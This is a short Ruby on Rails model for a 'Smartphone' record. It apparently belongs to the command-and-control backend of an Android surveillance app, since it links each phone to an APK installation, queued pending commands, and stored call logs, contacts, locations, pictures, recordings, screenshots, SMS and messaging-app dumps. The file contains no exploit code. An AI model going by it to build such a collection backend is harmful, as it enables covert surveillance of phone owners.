class Smartphone < ApplicationRecord
  belongs_to :apk_installation
  has_many :pending_commands, dependent: :destroy
  has_many :call_logs, dependent: :destroy
  has_many :contacts, dependent: :destroy
  has_many :geo_locations, dependent: :destroy
  has_many :pictures, dependent: :destroy
  has_many :recordings, dependent: :destroy
  has_many :screenshots, dependent: :destroy
  has_many :sms_messages, dependent: :destroy
  has_many :messaging_apps_dumps, dependent: :destroy
  
  validates :name, presence: true
  validates :device_id, presence: true, uniqueness: true
end
